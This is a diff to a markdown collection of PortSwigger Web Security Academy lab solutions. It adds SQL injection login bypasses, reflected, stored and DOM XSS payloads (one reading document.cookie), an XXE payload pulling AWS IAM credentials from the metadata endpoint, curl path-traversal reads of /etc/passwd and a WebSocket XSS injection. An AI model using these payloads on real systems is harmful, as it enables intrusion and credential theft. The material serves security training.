@@ -11,6 +11,80 @@
 
 **Mitigation**
 
+## SQL injection
+
+### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+
+    https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
+
+Payload: `' OR 'a'='a'--`
+
+Solution:
+
+    https://ac621fd21eb2b0e1c082847f00be0097.web-security-academy.net/filter?category=%27%20OR%20%27a%27=%27a%27--
+
+### Lab: SQL injection vulnerability allowing login bypass
+
+    https://portswigger.net/web-security/sql-injection/lab-login-bypass
+
+Payload: `' or '1'='1`
+
+Solution:
+
+    curl -s https://ac961fbe1e874560c0a53e2700c50025.web-security-academy.net/login -d 'csrf=02gPIAfYLxmgx07NosP5ChXUji8LZDi0&username=administrator&password=%27+or+%271%27%3D%271'
+
+## XSS
+
+### Lab: Reflected XSS into HTML context with nothing encoded
+
+    https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
+
+Payload: `<script>alert(1)</script>`
+
+Solution:
+
+    https://ac301f9a1feab630c06628c800590004.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+### Lab: Stored XSS into HTML context with nothing encoded
+
+    https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded
+
+Payload: `<script>alert(1)</script>`
+
+Solution:
+
+    curl -s https://ac441f571ee3c7f6c0d47ecf009500b5.web-security-academy.net/post/comment -d 'csrf=JjGC1fbulzEdU0pPT6g2Ty2tBWcjoEaq&postId=9&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&name=sdf&email=sdfsd%40sdfsdfsdf.er&website=http%3A%2F%2Fdfsd.df'
+
+### Lab: DOM XSS in document.write sink using source location.search
+
+    https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
+
+Payload: `"><script>alert(1)</script>`
+
+Solution:
+
+    https://aca31fc71ff01052c05f047b00ea000b.web-security-academy.net/?search=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+### Lab: DOM XSS in innerHTML sink using source location.search
+
+    https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
+
+Payload: `<img src=1 onerror='alert(1)'/>`
+
+Solution:
+
+    https://ac9b1f881fdbcb19c0c5026f00d3008b.web-security-academy.net/?search=%3Cimg+src%3D1+onerror%3D%27alert%281%29%27%2F%3E
+
+### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
+
+    https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
+
+Payload: `javascript:alert(document.cookie)`
+
+Solution:
+
+    https://accb1fd31e8cc586c08e432600d300df.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
+
 ## OAuth authentication
 
 ### Lab: Forced OAuth profile linking
@@ -77,13 +151,15 @@ Payload:
 ```
 
 
-**Mitigation**
-
 ### Lab: Exploiting XXE to perform SSRF attacks
 
     https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
 
-Solution:
+Payload:
+
+```
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
 
 ## Cross-site request forgery (CSRF)
 
@@ -1090,6 +1166,14 @@ Solution:
 
     curl -s https://ac6e1f941f6b5fc4c0268759008a0086.web-security-academy.net/image?filename=../../../etc/passwd
 
+## Lab: File path traversal, validation of file extension with null byte bypass
+
+    https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass
+
+Solution:
+
+    curl -s https://acca1fb61f2f6549c01b7fe40084009d.web-security-academy.net/image?filename=../../../etc/passwd%00.jpg
+
 ## Insecure deserialization
 
 ### Lab: Modifying serialized objects
@@ -1131,13 +1215,34 @@ Solution (as previously but explicitly spoof `Content-Type`):
 
     https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
 
+Solution steps:
+
+1) Log in
+2) Intercept 'Add to cart' request and change its `price` parameter
+3) Buy product for chosen price
+
 ### Lab: High-level logic vulnerability
 
     https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level
 
+Solution:
+
+1) Log in
+2) Observe that in `POST /cart` request parameter `quantity` support negative numbers. Therefore total price could be negative
+3) Taking advantage of (2) put to cart -60 of 2nd product then add first product to the cart
+4) Total price will be counted: `price of the frst prduct + -60 * price of the 2nd product` so it will be less then number of your credits
+
 ### Lab: Inconsistent security controls
 
     https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls
+
+Solution steps:
+
+1) Register as a `administrator` user providing your attacker's email
+2) Active account using received activation link
+3) Log in
+4) Change your email to 'admin@dontwannacry.com`
+5) Access admin panel and delete 'carlos' user
 
 ### Lab: Flawed enforcement of business rules
 
@@ -1148,6 +1253,12 @@ Solution (as previously but explicitly spoof `Content-Type`):
 ### Lab: Manipulating WebSocket messages to exploit vulnerabilities
 
     https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities
+
+Payload: `<img src=1 onerror='alert(1)'/>`
+
+Solution (3rd party tool used: https://github.com/vi/websocat):
+
+    echo -n "{\"message\":\"<img src=1 onerror='alert(1)'/>\"}" | websocat --text -v - wss://acc21f591f207752c010be23002b006e.web-security-academy.net/chat
 
 ## Authentication
 
